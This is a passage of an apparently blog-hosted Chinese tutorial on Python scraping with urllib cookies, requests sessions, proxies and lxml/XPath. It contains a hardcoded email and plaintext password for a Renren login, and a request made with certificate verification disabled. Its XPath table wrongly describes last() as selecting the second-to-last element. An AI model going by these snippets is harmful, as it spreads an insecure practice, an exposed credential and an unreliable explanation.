data=data)</span><br><span class="line">    opener.<span class="built_in">open</span>(req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_profile</span>(<span class="params">opener</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line">    req = request.Request(url,headers=headers)</span><br><span class="line">    resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    opener = get_opener()</span><br><span class="line">    login_renren(opener)</span><br><span class="line">    visit_profile(opener)//同一个opener，存了先前访问的cookie</span><br></pre></td></tr></table></figure><h2 id="保存cookie到本地："><a href="#保存cookie到本地：" class="headerlink" title="保存cookie到本地："></a>保存cookie到本地：</h2><p>保存<code>cookie</code>到本地，可以使用<code>cookiejar</code>的<code>save</code>方法，并且需要指定一个文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br><span class="line">cookiejar.save(ignore_discard=<span class="literal">True</span>,ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="从本地加载cookie："><a href="#从本地加载cookie：" class="headerlink" title="从本地加载cookie："></a>从本地加载cookie：</h2><p>从本地加载<code>cookie</code>，需要使用<code>cookiejar</code>的<code>load</code>方法，并且也需要指定方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">cookiejar.load(ignore_expires=<span class="literal">True</span>,ignore_discard=<span class="literal">True</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h1 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h1><p>虽然Python的标准库中 urllib模块已经包含了平常我们使用的大多数功能，但是它的 API 使用起来让人感觉不太好，而 Requests宣传是 “HTTP for Humans”，说明使用更简洁方便。</p><h2 id="安装和文档地址："><a href="#安装和文档地址：" class="headerlink" title="安装和文档地址："></a>安装和文档地址：</h2><p>利用<code>pip</code>可以非常方便的安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>中文文档：<a href="http://docs.python-requests.org/zh_CN/latest/index.html">http://docs.python-requests.org/zh_CN/latest/index.html</a><br>github地址：<a href="https://github.com/requests/requests">https://github.com/requests/requests</a></p><h2 id="发送GET请求："><a href="#发送GET请求：" class="headerlink" title="发送GET请求："></a>发送GET请求：</h2><ol><li><p>最简单的发送<code>get</code>请求就是通过<code>requests.get</code>来调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>添加headers和查询参数：<br>如果想添加 headers，可以传入headers参数来增加请求头中的headers信息。如果要将参数放在url中传递，可以利用 params 参数。相关示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">kw = &#123;<span class="string">&#x27;wd&#x27;</span>:<span class="string">&#x27;中国&#x27;</span>&#125;</span><br><span class="line">   </span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/s&quot;</span>, params = kw, headers = headers)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应内容，response.content返回的字节流数据</span></span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span>(response.url)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span>(response.encoding)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应码</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br></pre></td></tr></table></figure></li></ol><h2 id="发送POST请求："><a href="#发送POST请求：" class="headerlink" title="发送POST请求："></a>发送POST请求：</h2><ol><li><p>最基本的POST请求可以使用<code>post</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>,data=data)</span><br></pre></td></tr></table></figure></li><li><p>传入data数据：<br>这时候就不要再使用<code>urlencode</code>进行编码了，直接传入一个字典进去就可以了。比如请求拉勾网的数据的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">url = <span class="string">&quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;</span></span><br><span class="line">   </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">resp = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># 如果是json数据，直接可以调用json方法</span></span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用代理："><a href="#使用代理：" class="headerlink" title="使用代理："></a>使用代理：</h2><p>使用<code>requests</code>添加代理也非常简单，只要在请求的方法中（比如<code>get</code>或者<code>post</code>）传递<code>proxies</code>参数就可以了。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;171.14.209.180:27829&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers,proxies=proxy)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xx.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.text)</span><br></pre></td></tr></table></figure><h2 id="cookie："><a href="#cookie：" class="headerlink" title="cookie："></a>cookie：</h2><p>如果在一个响应中包含了<code>cookie</code>，那么可以利用<code>cookies</code>属性拿到这个返回的<code>cookie</code>值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies.get_dict())</span><br></pre></td></tr></table></figure><h2 id="session："><a href="#session：" class="headerlink" title="session："></a>session：</h2><p>之前使用<code>urllib</code>库，是可以使用<code>opener</code>发送多个请求，多个请求之间是可以共享<code>cookie</code>的。那么如果使用<code>requests</code>，也要达到共享<code>cookie</code>的目的，那么可以使用<code>requests</code>库给我们提供的<code>session</code>对象。注意，这里的<code>session</code>不是web开发中的那个session，这个地方只是一个会话的对象而已。还是以登录人人网为例，使用<code>requests</code>来实现。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问大鹏个人中心</span></span><br><span class="line">resp = session.get(<span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><h2 id="处理不信任的SSL证书："><a href="#处理不信任的SSL证书：" class="headerlink" title="处理不信任的SSL证书："></a>处理不信任的SSL证书：</h2><p>对于那些已经被信任的SSL证书的网站，比如<code>https://www.baidu.com/</code>，那么使用<code>requests</code>直接就可以正常的返回响应。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.get(<span class="string">&#x27;http://www.12306.cn/mormhweb/&#x27;</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="XPath语法和lxml模块"><a href="#XPath语法和lxml模块" class="headerlink" title="XPath语法和lxml模块"></a>XPath语法和lxml模块</h1><h2 id="什么是XPath？"><a href="#什么是XPath？" class="headerlink" title="什么是XPath？"></a>什么是XPath？</h2><p>xpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。</p><h2 id="XPath语法"><a href="#XPath语法" class="headerlink" title="XPath语法"></a>XPath语法</h2><h3 id="选取节点："><a href="#选取节点：" class="headerlink" title="选取节点："></a>选取节点：</h3><p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p><div class="table-container"><table><thead><tr><th>表达式</th><th>描述</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>nodename</td><td>选取此节点的所有子节点</td><td>bookstore</td><td>选取bookstore下所有的子节点</td></tr><tr><td>/</td><td>如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点</td><td>/bookstore</td><td>选取根元素下所有的bookstore节点</td></tr><tr><td>//</td><td>从全局节点中选择节点，随便在哪个位置</td><td>//book</td><td>从全局节点中找到所有的book节点</td></tr><tr><td>@</td><td>选取某个节点的属性</td><td>//book[@price]</td><td>选择所有拥有price属性的book节点</td></tr><tr><td>.</td><td>当前节点</td><td>./a</td><td>选取当前节点下的a标签</td></tr></tbody></table></div><h3 id="谓语："><a href="#谓语：" class="headerlink" title="谓语："></a>谓语：</h3><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点，被嵌在方括号中。<br>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p><div class="table-container"><table><thead><tr><th>路径表达式</th><th>描述</th></tr></thead><tbody><tr><td>/bookstore/book[1]</td><td>选取bookstore下的第一个子元素</td></tr><tr><td>/bookstore/book[last()]</td><td>选取bookstore下的倒数第二个book元素。</td></tr><tr><td>bookstore/book[position()&lt;3]</td><td>选取bookstore下前面两个子元素。</td></tr><tr><td>//book[@price]</td><td>选取拥有price属性的book元素</td></tr><tr><td>//book[@price=10]</td><td>选取所有属性price等于10的book元素</td></tr></tbody></table></div><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>*表示通配符。</p><div class="table-container"><table><thead><tr><th style="text-align:left">通配符</th><th style="text-align:left">描述</th><th style="text-align:left">示例</th><th style="text-align:left">结果</th></tr></thead><tbody><tr><td style="text-align:left">*</td><td style="text-align:left">匹配任意节点</td><td style="text-align:left">/bookstore/*</td><td style="text-align:left">选取bookstore下的所有子元素。</td></tr><tr><td style="text-align:left">@*</td><td style="text-align:left">匹配节点中的任何属性</td><td style="text-align:left">//book[@*]</td><td style="text-align:left">选取所有带有属性的book元素。</td></tr></tbody></table></div><h3 id="选取多个路径："><a href="#选取多个路径：" class="headerlink" title="选取多个路径："></a>选取多个路径：</h3><p>通过在路径表达式中使用“|”运算符，可以选取若干个路径。<br>示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//bookstore/book | //book/title</span><br><span class="line"># 选取所有book元素以及book元素下所有的title元素</span><br></pre></td></tr></table></figure><h2 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h2><p>lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。</p><p>lxml和正则一样，也是用 C 实现的，是一款高性能的 Python HTML/XML 解析器，我们可以利用之前学习的XPath语法，来快速的定位特定元素以及节点信息。</p><p>需要安装C语言库，可使用 pip 安装：<code>pip install lxml</code></p><h3 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h3><p>我们可以利用他来解析HTML代码，并且在解析HTML代码的时候，如果HTML代码不规范，他会自动的进行补全。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 lxml 的 etree 库</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree </span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt; # 注意，此处缺少一个 &lt;/li&gt; 闭合标签</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用etree.HTML，将字符串解析为HTML文档</span></span><br><span class="line">html = etree.HTML(text) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 按字符串序列化HTML文档</span></span><br><span class="line">result = etree.tostring(html) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输入结果如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到。lxml会自动修改HTML代码。例子中不仅补全了li标签，还添加了body，html标签。</p><h3 id="从文件中读取html代码："><a href="#从文件中读取html代码：" class="headerlink" title="从文件中读取html代码："></a>从文件中读取html代码：</h3><p>除了直接使用字符串进行解析，lxml还支持从文件中读取内容。我们新建一个hello.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hello.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后利用<code>etree.parse()</code>方法来读取文件。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取外部文件 hello.html</span></span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = etree.tostring(html, pretty_print=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输入结果和之前是相同的。</p><h3 id="在lxml中使用XPath语法："><a href="#在lxml中使用XPath语法：" class="headerlink" title="在lxml中使用XPath语法："></a>在lxml中使用XPath语法：</h3><ol><li><p>获取所有li标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(html)  <span class="comment"># 显示etree.parse() 返回类型</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 